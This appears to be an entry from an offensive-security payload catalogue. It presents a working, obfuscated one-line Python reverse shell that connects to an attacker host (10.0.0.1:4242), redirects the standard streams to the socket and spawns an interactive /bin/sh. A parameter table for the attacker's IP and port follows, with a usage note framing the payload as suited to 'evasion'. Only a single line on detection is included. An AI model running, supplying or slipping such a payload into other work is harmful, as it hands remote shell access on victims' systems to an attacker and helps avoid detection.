---
id: 5dae9f23-1f2c-410a-8ed8-9e374dec21b0
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - python
  - obfuscated
  - subprocess
validated: true
---

# Python-Short-Obfuscated-Reverse-Shell-Subprocess-Call

## Code

```python
python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.0.0.1",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```

## Description

Compacted version using aliases for subprocess.call with dup2.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | Attacker's IPv4 address | 10.0.0.1 |
| $_ATTACKER_PORT | Attacker's listening port | 4242 |

## Usage

For space-constrained executions with evasion.

## Detection

- Aliased __import__ + dup2 patterns.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
